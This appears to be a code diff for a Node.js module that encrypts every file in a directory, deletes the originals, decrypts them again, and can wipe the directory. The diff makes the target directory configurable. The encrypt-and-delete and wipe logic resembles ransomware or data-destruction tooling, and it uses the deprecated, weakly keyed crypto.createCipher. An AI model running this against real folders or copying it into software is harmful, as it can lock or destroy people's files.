@@ -14,7 +14,7 @@ let currentKey = null;
 
 const encrypt = (key) => {
     return new Promise((resolve, reject) => {
-        const docPath = path.join(__dirname, 'documents');
+        const docPath = path.join(config.DOCUMENT_LOCATION);
         fs.readdir(docPath, (err, files) => {
             if (err) {
                 console.log('Unable to scan directory: ' + err);
@@ -24,8 +24,8 @@ const encrypt = (key) => {
             let encPromises = files.map(file => {
                 return new Promise((resolve, reject) => {
                     const cipher = crypto.createCipher('aes-256-cbc', key);
-                    let filepath = path.join(__dirname, 'documents', file);
-                    let encFilePath = path.join(__dirname, 'documents', `${file}.enc`);
+                    let filepath = path.join(config.DOCUMENT_LOCATION, file);
+                    let encFilePath = path.join(config.DOCUMENT_LOCATION, `${file}.enc`);
                     console.log('Encrypting ' + file);
                     const handle = fs.createReadStream(filepath).pipe(cipher).pipe(fs.createWriteStream(encFilePath));
                     handle.on('finish', () => {
@@ -37,7 +37,7 @@ const encrypt = (key) => {
             Promise.all(encPromises).then(() => {
                 encrypted = true;
                 files.forEach(f => {
-                    let filepath = path.join(__dirname, 'documents', f);
+                    let filepath = path.join(config.DOCUMENT_LOCATION, f);
                     console.debug('Deleting ' + filepath);
                     fs.unlinkSync(filepath);
                 });
@@ -49,7 +49,7 @@ const encrypt = (key) => {
 
 const decrypt = (key) => {
     return new Promise(((resolve, reject) => {
-        fs.readdir(path.join(__dirname, 'documents'), (err, files) => {
+        fs.readdir(path.join(config.DOCUMENT_LOCATION), (err, files) => {
             if (err) {
                 console.log('Unable to scan directory: ' + err);
                 reject(err);
@@ -57,8 +57,8 @@ const decrypt = (key) => {
             let decPromises = files.map((file) => {
                 return new Promise((resolve, reject) => {
                     const decipher = crypto.createDecipher('aes-256-cbc', key);
-                    const encFilepath = path.join(__dirname, 'documents', file);
-                    const originFilePath = path.join(__dirname, 'documents', file.replace('.enc', ''));
+                    const encFilepath = path.join(config.DOCUMENT_LOCATION, file);
+                    const originFilePath = path.join(config.DOCUMENT_LOCATION, file.replace('.enc', ''));
                     console.log('Decrypting ' + file);
                     const handle = fs.createReadStream(encFilepath).pipe(decipher).pipe(fs.createWriteStream(originFilePath));
                     handle.on('finish', () => {
@@ -85,16 +85,16 @@ const decrypt = (key) => {
     }));
 };
 
-const wipe = (scope) => {
+const wipe = () => {
     return new Promise((resolve, reject) => {
-        fs.readdir(path.join(__dirname, scope), (err, files) => {
+        fs.readdir(path.join(config.DOCUMENT_LOCATION), (err, files) => {
             if (err) {
-                console.log(`Unable to scan directory: ${scope}` + err);
+                console.log(`Unable to scan directory: ${config.DOCUMENT_LOCATION}` + err);
                 reject(err);
             } else {
                 let deletePromises = files.map(file => {
                     return new Promise((resolve) => {
-                        const filePath = path.join(__dirname, scope, file);
+                        const filePath = path.join(config.DOCUMENT_LOCATION, file);
                         try {
                             console.log(`Deleting: ${filePath}`);
                             fs.unlinkSync(filePath);
